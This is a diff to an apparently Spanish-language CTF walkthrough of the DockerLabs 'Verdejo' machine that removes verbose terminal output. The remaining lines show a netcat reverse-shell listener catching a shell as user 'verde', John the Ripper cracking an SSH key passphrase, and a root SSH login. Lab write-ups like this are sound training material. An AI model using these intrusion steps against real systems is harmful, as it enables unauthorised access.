@@ -121,8 +121,6 @@ Vemos que obtenemos acceso a la maquina como el usuario `verde`:
 └─$ nc -nlvp 4444                                                        
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 50248
-bash: cannot set terminal process group (94): Inappropriate ioctl for device
-bash: no job control in this shell
 verde@b2cec569817d:~$ whoami
 whoami
 verde
@@ -191,16 +189,8 @@ Por ello, podemos tratar de obtener la clave por fuerza bruta:
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
 └─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash 
-Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
-Cost 2 (iteration count) is 16 for all loaded hashes
-Will run 8 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
 h*****           (id_rsa)     
-1g 0:00:01:11 DONE (2025-10-28 00:23) 0.01396g/s 50.05p/s 50.05c/s 50.05C/s cougar..fresa
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed.
 ```
 
 Indicando la clave, vemos que ahora accedemos correctamente a la maquina como el usuario `root`:
@@ -209,15 +199,6 @@ Indicando la clave, vemos que ahora accedemos correctamente a la maquina como el
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
 └─$ ssh -i id_rsa root@172.17.0.2                         
 Enter passphrase for key 'id_rsa': 
-Linux b2cec569817d 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Wed May 22 10:36:51 2024 from 172.17.0.1
 root@b2cec569817d:~# whoami
 root
 ```
